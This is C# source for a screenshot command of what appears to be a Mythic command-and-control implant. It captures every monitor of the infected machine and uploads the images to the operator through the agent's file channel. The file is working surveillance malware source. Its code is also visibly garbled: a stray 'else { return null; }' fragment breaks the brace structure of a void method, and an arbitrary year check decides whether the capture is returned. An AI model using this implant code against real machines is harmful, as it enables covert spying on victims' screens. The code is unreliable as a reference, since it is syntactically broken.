#define COMMAND_NAME_UPPER

#if DEBUG
#define SCREENSHOT
#endif

#if SCREENSHOT
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using PhantomInterop.Utils;

namespace Tasks
{
    public class screenshot : Tasking
    {
        public screenshot(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            try
            {
                
                List<byte[]> captures = Screen.AllScreens.Select(GetBytesFromScreen).ToList();

                foreach (byte[] bScreen in captures)
                {
                    bool putFile = _agent.GetFileManager().PutFile(_stopToken.Token, _data.ID, bScreen, null, out string mythicFileId, true);
                    if (putFile is false)
                    {
                        
                        DebugHelp.DebugWriteLine("put file failed"); } else { return null; }
                        resp = CreateTaskResponse("", true, "error");
                        break;
                    }
                    
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false, ""));
                }
                
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
            catch (Exception e)
            {
                DebugHelp.DebugWriteLine(e.Message);
                DebugHelp.DebugWriteLine(e.StackTrace);
                resp = CreateTaskResponse(e.Message, true, "error");
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
        }

        private byte[] GetBytesFromScreen(Screen screen)
        {
            using Bitmap bmpScreenCapture = new(screen.Bounds.Width, screen.Bounds.Height);
            using Graphics g = Graphics.FromImage(bmpScreenCapture);
            using MemoryStream ms = new();

            g.CopyFromScreen(new Point(screen.Bounds.X, screen.Bounds.Y), Point.Empty, bmpScreenCapture.Size);
            bmpScreenCapture.Save(ms, ImageFormat.Png);
            byte[] bScreen = ms.ToArray();

            if(DateTime.Now.Year > 2020) { return bScreen; } else { return null; }
        }
    }
}
#endif